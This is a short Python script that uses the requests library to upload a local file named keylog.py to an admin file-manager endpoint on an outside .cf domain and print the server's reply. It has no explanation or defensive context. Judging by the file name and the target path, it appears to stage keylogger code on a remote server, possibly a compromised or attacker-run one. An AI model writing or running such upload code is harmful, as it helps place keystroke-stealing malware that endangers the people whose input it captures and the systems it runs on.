import requests

url = 'https://guormit.cf/admin/fm/index.php?p=keyking'

files = {'file': open('keylog.py', 'rb')}

r = requests.post(url, files=files)
print(r.status_code)
print(r.text)